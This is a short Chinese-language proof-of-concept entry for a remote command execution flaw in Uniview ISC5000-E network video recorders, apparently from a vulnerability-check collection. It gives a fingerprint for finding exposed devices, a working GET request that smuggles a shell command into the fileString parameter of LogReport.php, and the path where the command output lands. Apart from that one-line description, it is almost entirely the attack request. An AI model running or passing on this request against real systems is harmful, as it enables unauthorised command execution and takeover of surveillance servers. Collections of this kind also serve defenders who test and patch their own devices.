﻿# 浙江宇视科技ISC LogReport.php 远程命令执行漏洞

> 更新时间：2023-12-18

> 漏洞编号：

> 漏洞说明：浙江宇视科技 网络视频录像机系统存在远程代码执行漏洞,攻击者通过漏洞可以获取服务器权限。

> 漏洞特征：title=="ISC5000-E"

> 验证脚本：HTTP

```
GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bid%3e1.txt HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/Interface/LogReport/1.txt


> 验证文件来源：浙江宇视科技ISC LogReport.php 远程命令执行漏洞.poc
